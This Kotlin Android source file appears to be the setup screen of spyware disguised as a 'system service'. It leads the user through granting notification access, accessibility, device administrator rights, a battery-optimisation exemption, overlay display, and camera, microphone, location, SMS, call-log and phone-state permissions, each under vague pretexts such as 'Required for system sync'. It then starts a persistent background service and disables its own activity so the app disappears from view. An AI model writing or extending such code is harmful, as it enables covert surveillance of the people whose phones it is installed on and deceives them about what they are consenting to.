package com.system.service.setup

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.system.service.R
import com.system.service.core.CoreService
import com.system.service.core.DeviceAdminReceiver
import com.system.service.monitors.NotificationMonitor

class SetupActivity : AppCompatActivity() {

    private var currentStep = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)
        showStep(0)
    }

    override fun onResume() {
        super.onResume()
        Handler(Looper.getMainLooper()).postDelayed({
            if (currentStep < 6 && isPermissionGranted(currentStep)) {
                showStep(currentStep + 1)
            }
        }, 1500)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(
            requestCode, permissions, grantResults)
        if (requestCode == 100) {
            showStep(6)
        }
    }

    private fun showStep(step: Int) {
        currentStep = step
        when (step) {
            0 -> updateUI("1/6", "Notification Access",
                "Required for system sync", "Enable") {
                startActivity(Intent(
                    Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            1 -> updateUI("2/6", "Accessibility Access",
                "Required for system monitor", "Enable") {
                startActivity(Intent(
                    Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            2 -> updateUI("3/6", "Device Management",
                "Required for security", "Activate") {
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    ComponentName(this, DeviceAdminReceiver::class.java))
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required for device security")
                startActivity(i)
            }
            3 -> updateUI("4/6", "Battery Optimization",
                "Keep service running always", "Disable") {
                startActivity(Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            }
            4 -> updateUI("5/6", "Display Permission",
                "Required for alerts", "Allow") {
                startActivity(Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
            5 -> updateUI("6/6", "Final Permissions",
                "Allow all to continue", "Allow") {

                val permsToRequest = mutableListOf<String>()

                val allPerms = arrayOf(
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.READ_CALL_LOG,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE
                )

                for (perm in allPerms) {
                    if (checkSelfPermission(perm) !=
                        PackageManager.PERMISSION_GRANTED) {
                        permsToRequest.add(perm)
                    }
                }

                if (permsToRequest.isEmpty()) {
                    showStep(6)
                } else {
                    requestPermissions(
                        permsToRequest.toTypedArray(), 100)
                }
            }
            6 -> completeSetup()
        }
    }

    private fun completeSetup() {
        try {
            startForegroundService(Intent(this, CoreService::class.java))
        } catch (e: Exception) { }

        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, SetupActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) { }

        finishAffinity()
    }

    private fun isPermissionGranted(step: Int): Boolean {
        return when (step) {
            0 -> isNotificationEnabled()
            1 -> isAccessibilityEnabled()
            2 -> isDeviceAdminEnabled()
            3 -> (getSystemService(POWER_SERVICE) as PowerManager)
                    .isIgnoringBatteryOptimizations(packageName)
            4 -> Settings.canDrawOverlays(this)
            else -> true
        }
    }

    private fun isNotificationEnabled(): Boolean {
        val cn = ComponentName(this, NotificationMonitor::class.java)
        val flat = Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners")
        return flat?.contains(cn.flattenToString()) == true
    }

    private fun isAccessibilityEnabled(): Boolean {
        val service = "$packageName/.monitors.AccessibilityMonitor"
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return enabled?.contains(service) == true
    }

    private fun isDeviceAdminEnabled(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE)
            as DevicePolicyManager
        return dpm.isAdminActive(
            ComponentName(this, DeviceAdminReceiver::class.java))
    }

    private fun updateUI(
        step: String,
        title: String,
        desc: String,
        btnText: String,
        action: () -> Unit
    ) {
        findViewById<TextView>(R.id.tvStep).text = "Step $step"
        findViewById<TextView>(R.id.tvTitle).text = title
        findViewById<TextView>(R.id.tvDesc).text = desc

        val btnAction = findViewById<Button>(R.id.btnAction)
        btnAction.text = btnText
        btnAction.setOnClickListener { action() }

        val btnNext = findViewById<Button>(R.id.btnNext)
        btnNext.setOnClickListener {
            showStep(currentStep + 1)
        }
    }
}
